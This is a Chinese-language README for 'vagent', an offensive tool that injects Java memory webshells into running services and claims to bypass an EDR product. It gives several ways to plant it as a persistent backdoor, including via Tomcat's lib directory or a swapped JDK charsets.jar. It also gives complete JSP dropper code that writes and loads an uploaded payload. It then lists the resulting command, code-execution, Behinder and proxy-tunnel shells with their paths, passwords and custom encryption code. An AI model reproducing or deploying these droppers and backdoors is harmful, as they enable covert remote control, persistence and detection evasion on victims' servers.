# vagent内存马注入工具

### 使用说明：

vagent有四种使用方式，目前所有内置马都可以绕过青藤云EDR

#### 1.命令行方式加载

java -jar vagent.jar

会自动注入内存马到所有java起的服务内



#### 2.Tomcat lib 后门加载

将 vagent.jar 放在 Tomcat 目录下的lib目录就可以了，名字可以随意更改，Tomcat重启后会自动注入内存马



#### 3.jdk/jre Spring后门加载

将 vagent.jar 更名为 charsets.jar 放至 JAVA_HOME/jre/lib/ 目录下，替换原有的charsets.jar文件，Spring重启时会自动注入内存马

根据业务情况，有概率无需重启，发送下面的包就可以注入内存马

```http
GET / HTTP/1.1
Accept: text/html;charset=GBK
```



#### 4. JSP/java代码/命令写入文件 加载



##### 1.JAVA代码方式

需要先上传vagent.jar到目标服务器上

再运行下面的代码注入内存马

```java
java.net.URLClassLoader cl = new java.net.URLClassLoader(new java.net.URL[]{new java.io.File(FilePath).toURI().toURL()});
cl.loadClass("org.apache.catalina.servlets.Attach").getMethod("att", String.class).invoke(null,"ignored");
```



##### 2.JSP方式

```jsp
<%
    try {
        String f = System.getProperty("java.io.tmpdir") + "/" + Math.random();
        java.io.InputStream g = new java.util.zip.GZIPInputStream(request.getInputStream());
        java.io.FileOutputStream o = new java.io.FileOutputStream(f);
        byte[] t = new byte[1024];int n;while((n = g.read(t)) != -1) {o.write(t, 0, n);}g.close();o.close();
        java.net.URLClassLoader cl = new java.net.URLClassLoader(new java.net.URL[]{new java.io.File(f).toURI().toURL()});
        cl.loadClass("org.apache.catalina.servlets.Attach").getMethod("att", String.class).invoke(null,"ignored");
    } catch (Exception e) {
        out.println(e.getMessage());
    }
%>
```

然后用postman 发送gzip压缩后两次，注意是两次，的 vagent.jar 大马文件（用burp的paste from file 会出问题）

base64方式

```
<%
    try {
        String f = System.getProperty("java.io.tmpdir") + "/" + Math.random();
        String b = request.getParameter("c");
        Class base64;
        byte[] value = null;
        try {
            base64 =Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { b });
        }catch (Exception e){
            base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance();
            value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { b });
            e.printStackTrace();
        }
        java.io.InputStream d = new java.io.ByteArrayInputStream(value);
        java.io.InputStream g = new java.util.zip.GZIPInputStream(d);
        java.io.FileOutputStream o = new java.io.FileOutputStream(f);
        byte[] t = new byte[1024];int n;while((n = g.read(t)) != -1) {o.write(t, 0, n);}g.close();o.close();
        java.net.URLClassLoader cl = new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL("file:///"+f)}, getClass().getClassLoader());
        cl.loadClass("org.apache.catalina.servlets.Attach").getMethod("att", String.class).invoke(null,"ignored");
    }catch (Exception e){
        e.printStackTrace();
    }
%>
```



```bash
//gzip 压缩两次：

cp vagent.jar x
gzip x
mv x.gz x
gzip x
```

##### 3.利用命令写文件，使用vagent-mini先注入小马：

在遇到只有命令执行来写入文件的情况，可以先写入一个vagent-mini.jar小马

然后运行 java -jar vagent-mini.jar 注入小马

vagent-mini小马依赖于jdk环境，如果目标只有jre环境可能会注入失败，vagent大马则jre和jdk环境都通用

链接：以/faviconmini 结尾

```bash
//gzip 压缩两次：

cp vagent.jar x
gzip x
mv x.gz x
gzip x
```

然后用postman 发送gzip压缩两次，注意是两次，后的 vagent.jar 大马文件到链接路径注入大马（用burp的paste from file 会出问题）



### 注入的内存马：

#### 1.冰蝎

链接：以 /faviconb 结尾

密码：自定义加解密协议

```java
private byte[] Encrypt(byte[] data) {
    byte[] dt = new byte[data.length];
    for (int i = 0; i < data.length; i++) {
        dt[i] = (byte) (data[i] + 1);
    }
    try {
        java.io.ByteArrayOutputStream o = new java.io.ByteArrayOutputStream();
        java.util.zip.GZIPOutputStream g = new java.util.zip.GZIPOutputStream(o);
        g.write(dt);
        g.close();
        byte[] c = o.toByteArray();
        byte[] ct = new byte[c.length];

        for (int i = 0; i < c.length; i++) {
            ct[i] = (byte) (c[i] + 1);
        }
        return ct;
    } catch (Exception ignored) {
    }
    return data;
}


private byte[] Decrypt(byte[] data) {
    byte[] dt = new byte[data.length];
    for (int i = 0; i < data.length; i++) {
        dt[i] = (byte) (data[i] - 1);
    }
    try {
        java.io.ByteArrayInputStream t = new java.io.ByteArrayInputStream(dt);
        java.util.zip.GZIPInputStream i = new java.util.zip.GZIPInputStream(t, dt.length);
        byte[] c = r(i);
        byte[] ct = new byte[c.length];
        for (int b = 0; b < c.length; b++) {
            ct[b] = (byte) (c[b] - 1);
        }
        return ct;
    } catch (Exception ignored) {
    }
    return data;
}
private byte[] r(java.io.InputStream i) {
    byte[] temp = new byte[1024];
    java.io.ByteArrayOutputStream b = new java.io.ByteArrayOutputStream();
    int n;
    try {
        while((n = i.read(temp)) != -1) {b.write(temp, 0, n);
        }} catch (Exception ignored) {
    }
    return b.toByteArray();
}
```



#### 2.CMD马

链接：以 /faviconc 结尾

POST两次Base64以后的命令



#### 3.JS代码执行马

链接：以 /faviconjs 结尾

POST两次Base64以后的js代码

也可以使用蚁剑连接，密码是a



#### 4.Neo代理内存马

链接：以 /faviconneo 结尾

密码：page，要加--skip

python3 neoreg.py -k page -u URL -p 1083 --skip



#### 5.Suo5代理内存马

链接：以 /faviconsuo 结尾

无需密码



#### 6.WebSocket代理内存马

链接：以 /faviconws 结尾

无需密码，使用gost进行连接











